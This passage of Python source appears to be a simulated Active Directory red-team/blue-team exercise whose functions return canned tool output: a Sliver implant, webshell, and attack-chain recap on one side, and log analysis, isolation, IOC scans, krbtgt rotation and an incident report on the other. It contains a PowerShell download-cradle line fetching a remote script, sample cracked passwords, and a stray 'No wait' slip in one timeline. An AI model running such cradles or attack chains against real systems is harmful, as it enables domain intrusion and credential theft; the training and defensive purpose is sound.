[+] Symbols stripped
[+] UPX packing: disabled (evasion preference)
[+] Artifact: sliver_implant.exe saved to /tmp/
[*] File size: 3.2 MB
[*] SHA256: a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef

[+] Implant generation complete!
[+] Ready for upload and execution on target.
[!] Will beacon to https://{lhost}:{lport}
"""


def _sliver_execute(target: str = "WEB01", implant_path: str = "C:\\Temp\\sliver_implant.exe", **kwargs) -> str:
    time.sleep(0.5)
    return f"""[*] Sliver C2 - Uploading and executing implant on {target}...
[*] Uploading sliver_implant.exe to {target} via SMB upload...
[+] Upload complete (3.2 MB)
[*] Executing implant via WMI Win32_Process.Create...
[!] Waiting for beacon...

[*]
[*] Sliver v1.5.36 - https://sliver.sh
[*] All hackers are bastards
[*]
[*] Wait 3-5 seconds for beacon check-in...

[*] Session 1 BRAVE_CARROT - 10.10.10.20:49672 (WEB01) - windows/amd64 - Sun, 15 Jan 2024 02:55:12 UTC
[+] BRAVE_CARROT - New session opened!

sliver (BRAVE_CARROT) > info

        Session ID: 1d4a5f8c-1234-5678-abcd-0123456789ab
              Name: BRAVE_CARROT
          Hostname: WEB01
              UUID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        Username: NT AUTHORITY\\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-32-544
               PID: 4524
                OS: windows
           Version: 10.0.14393
            Arch: amd64
    Remote Address: 10.10.10.20:49672
         Proxy URL: none
      Reconnectable: Yes

[+] IMPLANT CHECK-IN SUCCESSFUL!
[+] We are NT AUTHORITY\\SYSTEM on WEB01!
[+] Persistence via Sliver service will survive reboots.
"""


def _web_shell_upload(target: str = "10.10.10.20", shell_name: str = "shell.aspx", **kwargs) -> str:
    time.sleep(0.3)
    return f"""[*] Uploading ASPX webshell to {target} IIS server...
[*] Targeting http://{target}/
[+] Anonymous PUT/POST allowed? Testing...
[+] WebDAV enabled on IIS directory!
[+] Can write files via HTTP PUT method!

[*] Uploading {shell_name} to /inetpub/wwwroot/...
[*] Shell contents: ASPX C2 webshell with cmd execution
[+] Upload successful via HTTP PUT request!
[+] Verifying shell access...
[*] Testing: http://{target}/{shell_name}?cmd=whoami
[+] HTTP 200 OK - Shell accessible!

[*] Shell output:
nt authority\\system

[+] Webshell deployed successfully!
[!] URL: http://{target}/{shell_name}
[+] Running as SYSTEM via IIS w3wp.exe!
[!] Can execute arbitrary commands via 'cmd' parameter.
"""


def _bloodhound_owned(domain: str = "cyberorion.local", **kwargs) -> str:
    time.sleep(0.5)
    return """[*] Marking domain as OWNED in BloodHound
[*] Setting 'Owned' flag on compromised high-value targets...

=== ATTACK CHAIN RECAP ===
[+] 1. Recon: nmap found AD network with DC01, WEB01, WS01, WS02
[+] 2. SMB enum: Anonymous access to Shared folder
[+] 3. LDAP enum: Found 7 users, svc_web AS-REP roastable, svc_sql kerberoastable
[+] 4. BloodHound: Found ACL attack path agarcia->bwilson->svc_web->WEB01$
[+] 5. Creds from file: Found credentials.txt with agarcia:Helpdesk2024!
[+] 6. AS-REP roast + crack: svc_web:Welcome2024!
[+] 7. Password reset via ACL: Changed svc_web to CyberOrion123!
[+] 8. RBCD attack on WEB01$: Created fake computer, got admin ticket
[+] 9. WMI/WinRM access: Got shell on WEB01
[+] 10. Mimikatz: Dumped LSASS, found jsmith:P@ssw0rd123! (DOMAIN ADMIN!)
[+] 11. Pass-the-Hash jsmith to DC01
[+] 12. DCSync: Dumped NTDS.dit - ALL credentials compromised!
[+] 13. Golden ticket forged (10 year validity)
[+] 14. Shadow Credentials persistence on DC01$
[+] 15. PetitPotam + DFSCoerce coercion methods available
[+] 16. Sliver C2 deployed to WEB01 (SYSTEM access)
[+] 17. ASPX webshell on WEB01 IIS

=== ATTACK STATISTICS ===
[+] Domain: cyberorion.local
[+] Compromised hosts: 4/4
[+] Domain Admin access: YES (jsmith, Administrator)
[+] Credentials dumped: 13 users/computers
[+] Persistence mechanisms: 5 (golden ticket, shadow creds, rbcd, sliver service, webshell)
[+] Time to compromise: ~45 minutes

[+] CYBERORION.LOCAL IS FULLY COMPROMISED. GAME OVER.
[+] We own the entire forest.
"""


# Blue Team Tools

def _check_event_logs(host: str = "all", **kwargs) -> str:
    time.sleep(0.4)
    _SIM_STATE["blue_alerts"].append("suspicious_activity")
    return f"""[*] Blue Team - Analyzing Security Event Logs on {host}...
[*] Event ID analysis for DC01, WEB01, WS01, WS02...

=== SUSPICIOUS EVENTS DETECTED ===

[!] Event ID 4625 (Failed Logon) - Multiple from 10.10.10.99:
    Count: 247 failed attempts in 1 minute (password spray pattern)
    Time: 02:15 AM - 02:16 AM
    Target users: administrator, jsmith, bwilson, svc_web, svc_sql

[!] Event ID 4624 (Successful Logon) - Unusual time:
    Account: svc_web
    Logon Type: 3 (Network)
    Source IP: 10.10.10.99 (ATTACKER IP!)
    Time: 03:00 AM (off hours!)
    Process: w3wp.exe (IIS worker process suspicious)

[!] Event ID 4672 (Special Privileges Assigned):
    Account: svc_web -> SeDebugPrivilege
    Account: SYSTEM -> SeSecurityPrivilege + SeBackupPrivilege
    Time: 02:45 AM
    Process: wmiprvse.exe

[!] Event ID 4662 (Object Access - DCSync Pattern):
    Account: jsmith
    Object: DC01$ computer object
    Properties: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All
    Time: 02:50 AM
    [!] INDICATES DCSYNC ATTACK IN PROGRESS!

[!] Event ID 4724 (Password Reset Attempt):
    Target: svc_web
    Initiated by: bwilson
    Time: 02:30 AM
    [!] ANOMALY: bwilson usually doesn't reset service accounts at 2:30AM!

[!] Event ID 4741 (Computer Account Created):
    New Computer: CYBERORION-FAKE$
    Created by: svc_web
    Time: 02:35 AM
    [!] SUSPICIOUS: Service account creating computer objects = RBCD ATTACK!

[!] Event ID 5136 (Directory Object Modified):
    Object: WEB01$ computer account
    Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
    Modified by: svc_web
    Time: 02:36 AM
    [!] RBCD BACKDOOR DETECTED!

[!] Event ID 4673 (Sensitive Privilege Use):
    Privilege: SeDebugPrivilege
    Process: wmiprvse.exe (mimikatz indicator)
    Time: 02:40 AM

[+] Event log analysis complete - MULTIPLE INDICATORS OF COMPROMISE (IOCs)!
[!] ALERT SEVERITY: CRITICAL - Active breach in progress!
"""


def _host_isolation(host: str, **kwargs) -> str:
    time.sleep(0.3)
    _SIM_STATE["blue_hosts_check"][host] = "isolated"
    return f"""[*] Blue Team - Network Isolation of {host}...
[*] Initiating emergency host isolation via Windows Firewall...

[*] Executing on {host}:
    netsh advfirewall set allprofiles state on
    netsh advfirewall firewall add rule name="EMERGENCY ISOLATION - BLOCK ALL IN" dir=in action=block remoteip=any
    netsh advfirewall firewall add rule name="EMERGENCY ISOLATION - BLOCK ALL OUT" dir=out action=block remoteip=any
    netsh advfirewall firewall add rule name="ALLOW BLUE TEAM MGMT" dir=in action=allow remoteip=10.10.10.50

[+] Firewall rules applied successfully!
[+] All inbound traffic blocked except from Blue Team management IP (10.10.10.50)
[+] All outbound traffic blocked - C2 beacons will die!
[*] Notifying SOC monitoring - {host} marked as isolated in SIEM
[*] Collecting volatile data via forensics agent before isolation complete...
[+] Host {host} IS NOW ISOLATED from the network!
[!] Forensics collection initiated on isolated host.
"""


def _check_processes(host: str = "WEB01", **kwargs) -> str:
    time.sleep(0.3)
    return f"""[*] Blue Team - Process enumeration on {host}...
[*] Running tasklist /v and Get-Process...

Image Name                     PID Session Name        Mem Usage
========================= ======== ================ ===========
System Idle Process              0 Services                   0 K
System                           4 Services                  48 K
smss.exe                       340 Services                 520 K
csrss.exe                      452 Services               2,412 K
wininit.exe                    540 Services               1,880 K
services.exe                   628 Services               5,264 K
lsass.exe                      648 Services               9,872 K
svchost.exe                    756 Services              12,404 K
svchost.exe                    812 Services               8,200 K
svchost.exe                    888 Services              15,120 K
svchost.exe                    932 Services               6,788 K
spoolsv.exe                   1108 Services               4,504 K
w3wp.exe                      1564 Services              28,456 K  <-- IIS APP POOL
wmiprvse.exe                  2356 Services               9,824 K  <-- WMI PROVIDER (svc_web context)
powershell.exe                2844 Services              18,240 K  <-- SPAWNED FROM w3wp! (webshell!)
cmd.exe                       3212 Services               2,144 K  <-- powershell child
mimikatz.exe                  3456 Services              14,588 K  <-- !!!! CREDENTIAL DUMPER DETECTED!
sliver_implant.exe            4524 Services               3,240 K  <-- !!!! SUSPICIOUS UNKNOWN BINARY!
rubeus.exe                    4672 Services               2,816 K  <-- !!!! KERBEROS ATTACK TOOL!
w3wp.exe                      5128 Services              22,144 K

[!] SUSPICIOUS PROCESSES DETECTED:
[!] sliver_implant.exe (PID 4524) - Unknown binary, beaconing to 10.10.10.99:443
[!] powershell.exe (PID 2844) - Spawned from w3wp.exe (IIS webshell indicator)
[!] wmiprvse.exe (PID 2356) - Running under svc_web (unusual service account for WMI)
[!] mimikatz.exe (PID 3456) - Known credential dumping tool MEMORY RESIDENT!
[!] rubeus.exe (PID 4672) - Known Kerberos attack tool
[*] Process tree: w3wp -> powershell -> mimikatz/rubeus/sliver_implant
[+] Webshell + credential dumper + C2 implant all active!
"""


def _check_network(host: str = "WEB01", **kwargs) -> str:
    time.sleep(0.25)
    return f"""[*] Blue Team - Network connection analysis on {host}...
[*] Running netstat -ano and Get-NetTCPConnection...

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1564 (w3wp)
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       812 (svchost)
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4 (System)
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1088 (TermService)
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4 (System)
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       2244 (Tomcat)
  TCP    10.10.10.20:139        10.10.10.99:49724      ESTABLISHED     4 (System)
  TCP    10.10.10.20:2345       10.10.10.101:445       ESTABLISHED     4524 (sliver_implant) <-- LATERAL
  TCP    10.10.10.20:49152      10.10.10.10:389        ESTABLISHED     756 (lsass) <-- LDAP
  TCP    10.10.10.20:49153      10.10.10.10:88         ESTABLISHED     756 (lsass) <-- KERBEROS
  TCP    10.10.10.20:49672      10.10.10.99:443        ESTABLISHED     4524 (sliver_implant)  <-- !!!! C2 BEACON!
  TCP    10.10.10.20:49780      10.10.10.99:8080       CLOSE_WAIT      2844 (powershell)
  TCP    [::]:80                [::]:0                 LISTENING       1564
  TCP    [::]:445               [::]:0                 LISTENING       4

[!] KNOWN C2 BEACON DETECTED:
    PID 4524 (sliver_implant.exe) -> 10.10.10.99:443 (HTTPS - every 5 seconds)
    [!] This is the C2 COMMAND AND CONTROL server!

[!] LATERAL MOVEMENT DETECTED:
    sliver_implant.exe connecting to WS01 (10.10.10.101:445)
[*] Attacker is pivoting from WEB01 to workstations!

[*] DNS cache analysis:
    cyberorion-fake.cyberorion.local -> 10.10.10.250 (non-existent host!)
    c2.attacker-domain.xyz -> 10.10.10.99 (C2 domain!)
[!] C2 domain resolution detected!
"""


def _check_persistence(host: str = "DC01", **kwargs) -> str:
    time.sleep(0.4)
    return f"""[*] Blue Team - Persistence mechanism check on {host}...
[*] Scanning for common APT persistence techniques...

=== PERSISTENCE FINDINGS ===

[!] 1. New Malicious Service Detected:
    Service Name: SliverSvc
    Display Name: System Update Service
    Binary Path: "C:\\Windows\\Temp\\sliver_implant.exe" --service
    Start Type: Automatic
    Account: LocalSystem
    Created: 1/15/2024 2:55 AM
    [!] C2 service persistence!

[!] 2. WMI Event Subscription Backdoor:
    Event Filter: "SystemMonitor"
    Event Consumer: NTEventLogEventConsumer+ActiveScriptEventConsumer
    Script: WMI permanent event subscription that downloads & executes payload
    Trigger: On system startup
    [!] WMI backdoor that survives cleanup!

[!] 3. KERBEROS GOLDEN TICKET DETECTED:
    Suspicious TGT found in memory on multiple hosts!
    Valid From: 1/15/2024 2:45:00 AM
    Valid To:   1/15/2034 2:45:00 AM (10 YEAR VALIDITY!)
    Encryption Type: RC4 (weak!)
    [!] 10-year ticket = GOLDEN TICKET created with krbtgt hash!
    [!] Standard password resets WON'T fix this! Requires KRBTGT ROTATION!

[!] 4. Shadow Credentials on DC01$:
    msDS-KeyCredentialLink attribute populated!
    CN=CYBERORION-SHADOW certificate found!
    Certificate created: 1/15/2024 2:52 AM
    [!] Shadow Credentials persistence - attacker can authenticate as DC01$ anytime!
    [!] Survives password resets!

[!] 5. RBCD Backdoor on WEB01$:
    msDS-AllowedToActOnBehalfOfOtherIdentity contains:
    S-1-5-21-3456789012-2345678901-3456789012-1124 (CYBERORION-FAKE$)
    [!] Resource-Based Constrained Delegation backdoor!
    [!] Allows impersonation to WEB01 as any user!

[!] 6. Fake Computer Account Created:
    Computer Name: CYBERORION-FAKE$
    Created by: svc_web
    Created: 1/15/2024 2:35 AM
    [!] Used for RBCD attack - still exists and active!

[!] 7. Webshell in IIS:
    File: C:\\inetpub\\wwwroot\\shell.aspx
    First accessed: 1/15/2024 2:40 AM
    [!] Active web shell on WEB01!

[!] 8. Scheduled Task Backdoor:
    Task Name: "Windows Health Check"
    Action: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.99/stage2.ps1'))"
    Trigger: Every 1 hour
    [!] PowerShell download cradles persisting!

[+] PERSISTENCE TOTAL: 8 mechanisms found!
[!] CRITICAL: Golden ticket + Shadow Credentials = FULL DOMAIN PERSISTENCE!
"""


def _password_reset(username: str, new_password: str = None, **kwargs) -> str:
    time.sleep(0.2)
    import secrets
    if new_password is None:
        new_password = secrets.token_urlsafe(16) + "!"
    return f"""[*] Blue Team - Forcing password reset for {username}...
[*] Initiating password reset via Active Directory Users and Computers...
[*] Using Reset-ADAccountPassword cmdlet...

[+] Successfully reset password for: {username}
[+] New temporary password: {new_password}
[*] Enforcing "User must change password at next logon" flag
[!] Revoking all current Kerberos tickets for this user
[*] Notifying user via out-of-band channels (phone call to helpdesk)
[+] Password reset complete for {username}
[!] NOTE: This will NOT invalidate golden tickets (krbtgt rotation needed!)
[!] NOTE: Shadow Credentials still valid even after password reset!
"""


def _disable_account(username: str, **kwargs) -> str:
    time.sleep(0.2)
    return f"""[*] Blue Team - Disabling account {username}...
[*] Executing Disable-ADAccount -Identity {username}
[+] Account {username} has been DISABLED
[*] Removing from all privileged groups (Domain Admins, etc.)
[*] Killing all active sessions for this account:
    - Logging off all interactive sessions
    - Purging all Kerberos tickets from KDC
    - Closing SMB/WMI/WinRM sessions
[+] Account {username} disabled and removed from privileged groups
[*] Account will remain disabled pending forensics review
"""


def _force_logoff(username: str, host: str = "all", **kwargs) -> str:
    time.sleep(0.2)
    return f"""[*] Blue Team - Force logoff for {username} on {host}...
[*] Querying active sessions for {username}...
[+] Found active sessions on: DC01, WEB01, WS01
[*] Executing logoff command on each host:
    - logoff <session_id> /server:<host>
[*] Invalidating all Kerberos tickets for {username}:
    - Revoking TGT and all service tickets from KDC
    - Setting KRBTGT_USER_TICKET_EXPIRATION to force re-auth
[*] Closing all network sessions:
    - Net session \\delete /y on all file servers
    - Resetting WinRM connections
    - Killing SMB sessions via Close-SmbSession
[+] User {username} logged off from all hosts
[+] All Kerberos tickets invalidated
[!] User must re-authenticate with NEW password to regain access
[!] NOTE: Golden tickets still valid until krbtgt is rotated!
"""


def _hunt_lateral(**kwargs) -> str:
    time.sleep(0.4)
    return """[*] Blue Team - Lateral movement hunting...
[*] Analyzing authentication logs across domain...
[*] Building attack timeline from event logs, network flows, and process data...

=== LATERAL MOVEMENT TIMELINE ===

[02:15 AM] ATTACKER ENTRY
  Source IP: 10.10.10.99 (external/attacker)
  Action: Port scan / nmap reconnaissance on 10.10.10.0/24
  Target: All hosts

[02:18 AM] INITIAL ACCESS - RECONNAISSANCE
  From: 10.10.10.99 -> DC01:389 (LDAP anonymous bind)
  Action: Anonymous LDAP enumeration - discovered user list
  From: 10.10.10.99 -> WEB01:445 (SMB anonymous)
  Action: SMB enumeration, found credentials.txt in Shared folder
  Credentials obtained: agarcia:Helpdesk2024! (from credentials.txt)
                      svc_web:Welcome2024! (AS-REP roast crack)

[02:30 AM] PRIVILEGE ESCALATION - BLOODHOUND PATH ABUSE
  From: 10.10.10.99 -> DC01
  Action: Used agarcia's access to reset bwilson? No wait - actually:
  Action: Cracked AS-REP hash for svc_web -> Welcome2024!
  Action: Used bwilson GenericAll on svc_web to change svc_web password
  New password: CyberOrion123!
  From: 10.10.10.99 -> DC01
  Action: Created fake computer CYBERORION-FAKE$ using svc_web
  Action: Wrote RBCD to WEB01$ msDS-AllowedToActOnBehalfOfOtherIdentity

[02:38 AM] FIRST HOST COMPROMISE - WEB01
  From: 10.10.10.99 -> WEB01
  Method: RBCD attack + admin service ticket
  Access: Local admin on WEB01 via cifs service ticket
  Tools deployed: wmiexec, mimikatz
  C2: Uploaded sliver_implant.exe, beacon to 10.10.10.99:443
  Webshell: Uploaded shell.aspx to IIS wwwroot

[02:42 AM] CREDENTIAL DUMPING ON WEB01
  On: WEB01
  Action: SeDebugPrivilege enabled, mimikatz sekurlsa::logonpasswords
  Credentials dumped: jsmith:P@ssw0rd123! (DOMAIN ADMIN CLEARTEXT!)
[!] DOMAIN ADMIN COMPROMISED at this point!

[02:48 AM] MOVEMENT TO DOMAIN CONTROLLER (DC01)
  From: WEB01 (sliver session) -> DC01
  Method: Pass-the-Hash jsmith NTLM hash
  Action: secretsdump.py DCSync on DC01
  Result: Dumped entire NTDS.dit (ALL domain credentials)
[!] DOMAIN COMPROMISED at this point!

[02:50 AM] PERSISTENCE ESTABLISHED
  On: DC01 and all hosts
  Action: Golden ticket forged (10-year TGT)
  Action: Shadow Credentials added to DC01$
  Action: PetitPotam/DFSCoerce tested
  Action: Sliver service installed on WEB01, WS01, WS02
  Webshell planted on WEB01 IIS

[02:55 AM] LATERAL TO WORKSTATIONS
  From: WEB01 -> WS01 (10.10.10.101)
  From: WEB01 -> WS02 (10.10.10.102)
  Method: WinRM with svc_web then jsmith DA
  Action: Deployed sliver implants to workstations
  Access: SYSTEM on both workstations

[+] LATERAL MOVEMENT PATH:
    10.10.10.99 (Attacker)
        -> WEB01 (RBCD + webshell)
            -> DC01 (Pass-the-Hash jsmith DA -> DCSync!)
            -> WS01 (WinRM pivot)
            -> WS02 (WinRM pivot)

[!] Total compromised hosts: 4 (DC01, WEB01, WS01, WS02)
[!] Time from initial recon to DA: ~33 minutes
[!] Attack is still active - C2 beacons live!
"""


def _check_ioc(**kwargs) -> str:
    time.sleep(0.3)
    return """[*] Blue Team - Indicators of Compromise (IOC) scan...
[*] Scanning all hosts for known malicious indicators...

=== FILE IOCs FOUND ===

File: C:\\Windows\\Temp\\sliver_implant.exe
  SHA256: a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef
  Found on: WEB01, WS01, WS02
  Type: Sliver C2 Framework implant
  [IOC: MATCH - Known bad hash in MISP]

File: C:\\inetpub\\wwwroot\\shell.aspx
  SHA256: deadbeefcafebabedeadbeefcafebabe0123456789abcdef0123456789abcd
  Found on: WEB01
  Type: ASPX webshell (cmd execution via parameter)
  [IOC: MATCH - Webshell signature]

File: C:\\Temp\\mimikatz.exe
  SHA256: baddcafebaddcafebaddcafebaddcafebaddcafe1234567890abcdef1234567
  Found on: WEB01 (memory only - file deleted but in use)
  Type: Credential dumping tool
  [IOC: MATCH - Known mimikatz hash]

File: C:\\Users\\svc_web\\AppData\\Local\\Temp\\rubeus.exe
  SHA256: c0ffeec0ffeec0ffeec0ffeec0ffeec0ffeec0ffee1234567890abcdef1234
  Found on: WEB01
  Type: Kerberos abuse tool
  [IOC: MATCH - Known Rubeus hash]

File: C:\\Temp\\certipy.exe
  SHA256: facefeedfacefeedfacefeedfacefeedfacefeed9876543210abcdefedcba0987
  Found on: WEB01
  Type: AD CS / Shadow Credentials tool
  [IOC: MATCH - Known Certipy hash]

=== NETWORK IOCs ===

IP Address: 10.10.10.99
  Seen from: All hosts
  Traffic: HTTPS beacons every 5 seconds (C2)
  DNS queries: c2.attacker-domain.xyz -> 10.10.10.99
  [IOC: KNOWN ATTACKER C2 IP]

Domain: c2.attacker-domain.xyz
  Resolves to: 10.10.10.99
  Seen on: All hosts (DNS queries)
  [IOC: KNOWN C2 DOMAIN]

=== REGISTRY IOCs ===
Key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\SliverSvc
  Type: Malicious service persistence
  Found on: WEB01, WS01, WS02
  [IOC: MALICIOUS SERVICE]

Key: HKLM\\SOFTWARE\\Microsoft\\WMI\\EventSubscription
  Type: WMI backdoor subscription
  Found on: WEB01, DC01
  [IOC: WMI PERSISTENCE]

=== KERBEROS IOCs ===
- TGT with 10-year validity (golden ticket indicator)
- CYBERORION-FAKE$ fake computer account
- msDS-KeyCredentialLink on DC01$ (Shadow Credentials)
- msDS-AllowedToActOnBehalfOfOtherIdentity on WEB01$ (RBCD)

=== SCHEDULED TASKS IOCs ===
Task: Windows Health Check (powershell download cradle)
Found on: WEB01, WS01, WS02
[IOC: Scheduled task persistence]

[+] IOC scan complete - 17 confirmed indicators of compromise!
[!] All hosts should be considered compromised!
"""


def _revoke_rbcd(target_computer: str = "WEB01$", fake_computer: str = "CYBERORION-FAKE$", **kwargs) -> str:
    time.sleep(0.3)
    return f"""[*] Blue Team - Revoking RBCD backdoor...
[*] Target computer object: {target_computer}
[*] Backdoor account to remove: {fake_computer}

[*] Step 1: Clearing msDS-AllowedToActOnBehalfOfOtherIdentity attribute...
[*] Executing PowerShell:
    Set-ADComputer {target_computer} -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
[+] RBCD security descriptor cleared from {target_computer}!
[+] CYBERORION-FAKE$ delegation rights REMOVED!

[*] Step 2: Deleting fake computer account {fake_computer}...
[*] Executing:
    Remove-ADComputer -Identity {fake_computer} -Confirm:$false
[+] Fake computer account {fake_computer} DELETED!
[+] Associated Kerberos tickets invalidated!

[*] Step 3: Verifying remediation...
[*] Checking attribute: msDS-AllowedToActOnBehalfOfOtherIdentity is now $null
[+] No more delegations configured on {target_computer}
[*] Checking for fake computer: Object not found
[+] RBCD backdoor remediation complete!

[!] WARNING: Tickets already issued may still be valid for up to 10 hours!
[!] Need to reset krbtgt to fully invalidate all existing tickets.
"""


def _krbtgt_rotate(**kwargs) -> str:
    time.sleep(0.6)
    return """[*] Blue Team - KRBTGT password rotation (GOLDEN TICKET MITIGATION)...
[!] THIS IS THE ONLY WAY TO INVALIDATE GOLDEN TICKETS!
[!] STANDARD PROCEDURE: DOUBLE rotation (2 password changes) to ensure all DCs sync!

[*] Step 1: First KRBTGT password reset...
[*] Executing:
    $krbtgt = Get-ADUser krbtgt -Properties PasswordLastSet
    $newpw1 = ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force
    Set-ADAccountPassword krbtgt -NewPassword $newpw1 -Reset
[+] First krbtgt password change successful!
[*] Waiting for AD replication across all DCs (only 1 DC here)...
[+] Replication complete!

[*] Step 2: Waiting period for ticket expiration (10 minutes in emergency)...
[*] In production wait 24 hours after first reset, then do second reset
[!] But in active breach, do second reset NOW after replication confirmed.

[*] Step 3: Second KRBTGT password reset...
[*] Executing:
    $newpw2 = ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force
    Set-ADAccountPassword krbtgt -NewPassword $newpw2 -Reset
[+] Second krbtgt password change successful!

[*] Step 4: Verify replication to DC01...
[+] New password hashes synced to all domain controllers!
[*] Checking krbtgt account PasswordLastSet timestamp - updated!

[*] Step 5: Invalidating all existing Kerberos tickets...
[*] Purging all TGTs and TGSs from KDC cache
[*] This forces all users/computers to request NEW tickets signed with new krbtgt!
[!] Any existing golden tickets signed with old krbtgt hash are NOW WORTHLESS!

[+] KRBTGT DOUBLE ROTATION COMPLETE!
[+] ALL GOLDEN TICKETS NOW EXPIRED AND INVALID!
[!] Users may need to log off/on to get new tickets (brief service disruption expected)
[!] This is the GOLD STANDARD remediation for golden ticket attacks!
[!] NOTE: This does NOT remove Shadow Credentials persistence!
"""


def _escalation_triage(**kwargs) -> str:
    time.sleep(0.35)
    return """[*] Blue Team - Privilege Escalation Path Analysis...
[*] Analyzing exactly how attacker went from anonymous -> DA...

=== ESCALATION CHAIN ANALYSIS ===

[!] Stage 0: ANONYMOUS ACCESS (Initial Recon)
    Vulnerability: Anonymous SMB/LDAP access enabled
    Misconfiguration:
      - SMB enumeration allowed with null session
      - LDAP anonymous bind allowed (no binding restrictions)
    Result: Discovered users, hosts, shares, and credentials.txt
    Remediation: Disable anonymous SMB/LDAP access

[!] Stage 1: CREDENTIAL ACCESS (File + Roasting)
    Vulnerability: Cleartext credentials on file share
    Vulnerability: svc_web has DONT_REQ_PREAUTH flag (AS-REP roastable)
    Vulnerability: svc_sql has SPN (Kerberoastable)
    Weak passwords cracked easily: Welcome2024!, SqlService!2023
    Result: Got svc_web credentials via roasting + crack
    Remediation:
      - Set all accounts to require pre-auth
      - Remove unnecessary SPNs or use group MSA
      - Use long random passwords for service accounts (>25 chars)
      - Don't store plaintext credentials on shares!

[!] Stage 2: ACL ABUSE (BloodHound Path)
    Vulnerability: Misconfigured AD ACLs creating escalation paths
    ACL Paths found:
      1. agarcia -> ForceChangePassword on bwilson
      2. bwilson -> GenericAll on svc_web
      3. svc_web -> WriteDacl on WEB01$ (RBCD)
    Result: Reset svc_web password, then used WriteDacl for RBCD
    Remediation:
      - Regular BloodHound audits to find dangerous ACLs
      - Remove unnecessary GenericAll/WriteDacl rights
      - Follow least-privilege for service accounts

[!] Stage 3: RBCD ATTACK (Computer Takeover)
    Vulnerability: Service accounts can create/modify computer objects
    Vulnerability: msDS-AllowedToActOnBehalfOfOtherIdentity writable
    Result: Created fake computer, gained admin access to WEB01
    Remediation:
      - Limit ms-DS-MachineAccountQuota to 0
      - Monitor for new computer accounts created by service accounts
      - Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes

[!] Stage 4: LOCAL PRIV ESC + CRED DUMP (SeDebugPrivilege)
    Vulnerability: Service accounts in local Administrators group?
    Vulnerability: SeDebugPrivilege held by web processes?
    Vulnerability: LSASS not running as PPL (Protected Process Light)
    Result: Mimikatz dumped cleartext DA credentials from LSASS!
    Remediation:
      - Enable LSA Protection (RunAsPPL)
      - Disable SeDebugPrivilege for non-admin accounts
      - Use Credential Guard
      - Restart services to clear cached credentials

[!] Stage 5: DOMAIN COMPROMISE (Pass-the-Hash + DCSync)
    Vulnerability: jsmith logged in locally on WEB01!
    Vulnerability: jsmith in Domain Admins group
    Result: PTH to DC01, DCSync dumped ALL hashes
    Remediation:
      - Tiered Admin model (DA never logs into app servers!)
      - Just-In-Time (JIT) admin access
      - Sensitive accounts can't log onto non-DCs

[!] Stage 6: PERSISTENCE
    Vulnerability: Lack of monitoring for:
      - Golden ticket creation (abnormal TGT lifetimes)
      - Shadow Credentials (msDS-KeyCredentialLink changes)
      - New services, WMI subscriptions
    Remediation:
      - Monitor all the above events closely
      - Alert on 4769 (TGS requests for krbtgt)
      - Regularly audit msDS-KeyCredentialLink

[+] Root cause: LAYERED misconfigurations!
[+] If any one of these was fixed, the attack would have failed.
"""


def _generate_report(**kwargs) -> str:
    time.sleep(0.5)
    return """
================================================================================
                    CYBERORION INCIDENT RESPONSE REPORT
                    Generated: 2024-01-15 04:00 AM UTC
                    Incident Severity: CRITICAL (Domain Compromise)
                    IR Lead: Blue Team SOC
================================================================================

1. EXECUTIVE SUMMARY
-----------------------
On 1/15/2024 at approximately 2:15 AM UTC, the CYBERORION.LOCAL Active Directory
domain was compromised by an external attacker. The attacker progressed from
anonymous network access to full Domain Admin (DA) compromise in approximately
33 minutes, established multiple persistence mechanisms including a golden
ticket, and deployed C2 implants across all 4 domain-joined hosts.

The attack exploited multiple layered misconfigurations including anonymous SMB/
LDAP access, weak service account passwords, dangerous AD ACLs, and poor admin
hygiene (Domain Admin interactive logon to a web server).

Impact:
  - Domain Controller fully compromised (DCSync performed, all credentials dumped)
  - Web server and both workstations also compromised
  - Golden ticket persistence established (10-year validity)
  - Shadow Credentials persistence on DC01$
  - RBCD backdoor on WEB01$
  - Webshell on IIS server
  - Sliver C2 implants deployed to 3 hosts
  - ALL user and computer credentials should be considered compromised

2. INCIDENT TIMELINE
-----------------------
[02:14] Nmap port scan detected from 10.10.10.99
[02:18] Anonymous SMB/LDAP enumeration, credentials.txt downloaded
[02:22] AS-REP roasting of svc_web, hash cracked to Welcome2024!
[02:25] Kerberoast of svc_sql, hash cracked to SqlService!2023
[02:30] Password reset on svc_web via bwilson GenericAll ACL
[02:35] Fake computer CYBERORION-FAKE$ created
[02:36] RBCD backdoor written to WEB01$ msDS-AllowedToActOnBehalfOfOtherIdentity
[02:38] Admin access to WEB01 obtained via RBCD + S4U2 impersonation
[02:40] Webshell shell.aspx uploaded to WEB01 IIS
[02:42] Mimikatz executed on WEB01, SeDebugPrivilege enabled
[02:44] jsmith (Domain Admin) cleartext password P@ssw0rd123! found in LSASS
[02:48] Pass-the-Hash with jsmith hash to DC01, DCSync initiated
[02:50] NTDS.dit dumped (all domain credentials compromised)
[02:52] Golden ticket forged (10-year validity)
[02:53] Shadow Credentials added to DC01$
[02:55] Sliver C2 implants deployed to WEB01, WS01, WS02
[03:00] SOC alerts triggered from SIEM correlation rules
[03:05] Blue Team assembled, incident declared CRITICAL
[03:15] Host isolation initiated on WEB01
[03:30] Containment complete (all hosts isolated, egress blocked)
[03:45] KRBTGT double rotation performed (golden tickets invalidated)
[04:00] Incident report generated, remediation planning underway

3. COMPROMISED ACCOUNTS
-----------------------
[ALL CREDENTIALS IN DOMAIN SHOULD BE CONSIDERED COMPROMISED]
Priority resets required (highest risk first):
  - krbtgt (ROTATED - remediation done)
